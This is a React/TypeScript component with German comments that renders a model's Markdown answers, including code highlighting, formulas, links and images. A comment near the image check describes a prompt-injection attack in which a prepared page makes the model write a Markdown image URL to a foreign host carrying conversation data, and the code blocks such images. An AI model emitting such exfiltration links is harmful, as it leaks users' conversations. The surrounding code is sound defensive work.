/** Antworten des Modells darstellen.
 *
 * Zwei Entscheidungen, die zusammengehören:
 *
 * **Kein `dangerouslySetInnerHTML`.** ``react-markdown`` baut React-Elemente
 * statt HTML-Text. Damit ist ausgeschlossen, dass Modellausgabe zu Markup
 * wird — und Modellausgabe enthält früher oder später ein ``<script>``, weil
 * jemand danach gefragt hat.
 *
 * **Nur neun Sprachen für die Hervorhebung.** ``highlight.js`` bringt fast
 * zweihundert mit; vollständig eingebunden wiegt es mehr als der Rest der
 * Anwendung zusammen. Neun decken ab, was hier vorkommt.
 */

import hljs from "highlight.js/lib/core";
import bash from "highlight.js/lib/languages/bash";
import go from "highlight.js/lib/languages/go";
import javascript from "highlight.js/lib/languages/javascript";
import json from "highlight.js/lib/languages/json";
import python from "highlight.js/lib/languages/python";
import rust from "highlight.js/lib/languages/rust";
import sql from "highlight.js/lib/languages/sql";
import typescript from "highlight.js/lib/languages/typescript";
import yaml from "highlight.js/lib/languages/yaml";
import { memo, useState } from "react";
import Markdown from "react-markdown";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import "katex/dist/katex.min.css";
import { Zeichen } from "./Zeichen";
import "./Antworttext.css";

for (const [name, sprache] of Object.entries({
  bash, go, javascript, json, python, rust, sql, typescript, yaml,
})) {
  hljs.registerLanguage(name, sprache);
}
// Was Leute tatsächlich in den Zaun schreiben.
hljs.registerAliases(["sh", "shell", "zsh", "console"], { languageName: "bash" });
hljs.registerAliases(["js", "jsx"], { languageName: "javascript" });
hljs.registerAliases(["ts", "tsx"], { languageName: "typescript" });
hljs.registerAliases(["py"], { languageName: "python" });
hljs.registerAliases(["yml"], { languageName: "yaml" });

/** Nur eigene Bilder laden: Downloads, Anhänge, eingebettete Daten. Ein Bild von fremder
 *  Adresse könnte Gesprächsinhalt nach aussen tragen — eine präparierte Webseite oder ein
 *  Dokument bringt das Modell dazu, `![](https://fremd/?d=…)` zu schreiben, und der Browser
 *  holt es ungefragt ab (2026-10-19). Die CSP in Caddy sperrt fremde Bilder zusätzlich. */
function eigenesBild(src: string | undefined): boolean {
  if (!src) return false;
  if (src.startsWith("data:image/")) return true;
  try {
    return new URL(src, window.location.href).origin === window.location.origin;
  } catch {
    return false;
  }
}

function Codeblock({ sprache, inhalt }: { sprache: string; inhalt: string }) {
  const [kopiert, setKopiert] = useState(false);
  const bekannt = sprache && hljs.getLanguage(sprache);
  const html = bekannt
    ? hljs.highlight(inhalt, { language: sprache }).value
    : null;

  async function kopieren() {
    try {
      await navigator.clipboard.writeText(inhalt);
      setKopiert(true);
      setTimeout(() => setKopiert(false), 1400);
    } catch {
      // Ohne Erlaubnis oder ohne HTTPS gibt es keine Zwischenablage. Dann
      // bleibt der Knopf stumm statt eine Fehlermeldung zu werfen — der Text
      // lässt sich immer noch markieren.
    }
  }

  return (
    <div className="codeblock">
      <div className="codeblock-kopf">
        <span className="marke">{sprache || "Text"}</span>
        <button type="button" onClick={kopieren} title="Kopieren">
          <Zeichen name={kopiert ? "haken" : "notiz"} groesse={13} />
          {kopiert ? "kopiert" : "kopieren"}
        </button>
      </div>
      <pre className="roller">
        {html ? (
          // Kein Modelltext: das HTML stammt aus highlight.js und enthält
          // nur <span class="hljs-*">, der Inhalt ist bereits entschärft.
          <code dangerouslySetInnerHTML={{ __html: html }} />
        ) : (
          <code>{inhalt}</code>
        )}
      </pre>
    </div>
  );
}

/** Das Modell schreibt Formeln als \(…\) und \[…\] (so verlangt es der
 *  Systemprompt — das alte Frontend hat es so gelernt). remark-math kennt nur
 *  $…$ und $$…$$. Code bleibt unangetastet, sonst würde aus einem
 *  regulären Ausdruck mit \( eine Formel. */
function formelnAngleichen(text: string): string {
  return text
    .split(/(```[\s\S]*?```|`[^`\n]*`)/g)
    .map((teil, i) =>
      i % 2 === 1
        ? teil
        : teil
            .replace(/\\\[([\s\S]+?)\\\]/g, (_, f: string) => `\n$$\n${f.trim()}\n$$\n`)
            .replace(/\\\(([\s\S]+?)\\\)/g, (_, f: string) => `$${f.trim()}$`),
    )
    .join("");
}

export const Antworttext = memo(function Antworttext({ text, laeuft }: { text: string; laeuft?: boolean }) {
  return (
    <div className={"antworttext fliesstext" + (laeuft ? " laeuft" : "")}>
      <Markdown
        remarkPlugins={[remarkGfm, [remarkMath, { singleDollarTextMath: true }]]}
        rehypePlugins={[[rehypeKatex, { throwOnError: false, strict: false }]]}
        components={{
          code({ className, children, ...rest }) {
            const roh = String(children).replace(/\n$/, "");
            const passt = /language-(\w+)/.exec(className ?? "");
            // Ein Download-Pfad als Inline-Code (das Modell schreibt ihn
            // manchmal so) wird zum Link — sonst kommt man nicht an die Datei.
            if (!passt && /^\/api\/download\/[\w.\-]+$/.test(roh)) {
              return (
                <a href={roh} target="_blank" rel="noopener noreferrer" className="code-inline">
                  {roh.split("/").pop()?.replace(/^[0-9a-f]{8}_/, "")}
                </a>
              );
            }
            // Ohne Sprache und ohne Zeilenumbruch: das ist Code im Fließtext.
            if (!passt && !roh.includes("\n")) {
              return (
                <code className="code-inline" {...rest}>
                  {children}
                </code>
              );
            }
            return <Codeblock sprache={passt?.[1] ?? ""} inhalt={roh} />;
          },
          // Verweise nach außen öffnen in einem neuen Tab, sonst verliert man
          // das Gespräch. `noreferrer` gehört dazu.
          a({ href, children }) {
            return (
              <a href={href} target="_blank" rel="noopener noreferrer">
                {children}
              </a>
            );
          },
          // Bilder öffnen per Klick in voller Grösse. Fremde nur als Link, nicht geladen.
          img({ src, alt }) {
            if (!eigenesBild(src)) {
              return (
                <a className="bild-fremd" href={src} target="_blank" rel="noopener noreferrer nofollow">
                  {alt || "Bild"} (externes Bild, nicht geladen)
                </a>
              );
            }
            return (
              <a href={src} target="_blank" rel="noopener noreferrer">
                <img src={src} alt={alt ?? ""} loading="lazy" />
              </a>
            );
          },
          table({ children }) {
            return (
              <div className="roller">
                <table>{children}</table>
              </div>
            );
          },
        }}
      >
        {formelnAngleichen(text)}
      </Markdown>
    </div>
  );
});
